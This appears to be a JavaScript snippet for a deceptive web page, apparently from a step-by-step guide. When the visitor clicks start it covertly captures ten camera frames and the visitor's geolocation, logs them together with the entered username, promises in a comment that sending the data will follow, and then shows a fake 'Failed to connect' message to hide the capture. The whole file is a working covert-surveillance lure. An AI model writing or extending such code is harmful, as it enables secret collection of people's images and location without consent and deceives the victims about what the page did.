const startBtn = document.getElementById('start-btn');
let videoStream = null;
let photos = [];

startBtn.addEventListener('click', async () => {
    const username = document.getElementById('username').value;
    if (!username) {
        alert('Please enter your username.');
        return;
    }

    // Request camera access and capture photos silently
    videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
    capturePhotos();

    // Get user location silently
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (position) => {
            const locationData = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude
            };

            // Send the data silently (I'll explain sending in the next step)
            console.log('Data captured', { username, photos, locationData });

            // Show "Failed to connect" message
            showFailedToConnect();
        }, error => {
            // Even if location fails, show "Failed to connect"
            showFailedToConnect();
        });
    } else {
        showFailedToConnect();
    }
});

async function capturePhotos() {
    const video = document.createElement('video');
    video.srcObject = videoStream;
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');

    // Wait for video to be ready
    await new Promise(resolve => video.addEventListener('loadedmetadata', resolve));

    for (let i = 0; i < 10; i++) {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        photos.push(canvas.toDataURL('image/png'));
    }

    videoStream.getTracks().forEach(track => track.stop()); // Stop the camera
}

function showFailedToConnect() {
    document.getElementById('main-content').style.display = 'none';
    document.getElementById('failed-message').style.display = 'block';
}
